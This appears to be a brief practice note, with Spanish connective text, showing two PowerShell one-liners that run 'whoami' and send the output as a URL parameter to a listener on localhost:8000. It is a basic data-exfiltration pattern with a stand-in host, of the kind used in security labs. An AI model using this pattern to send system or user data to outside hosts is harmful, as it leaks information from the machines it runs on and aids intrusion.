Invoke-WebRequest -Uri "http://localhost:8000/?data=$(whoami)"
o tambien 
$resultado = whoami
Invoke-WebRequest -Uri "http://localhost:8000/?data=$resultado"
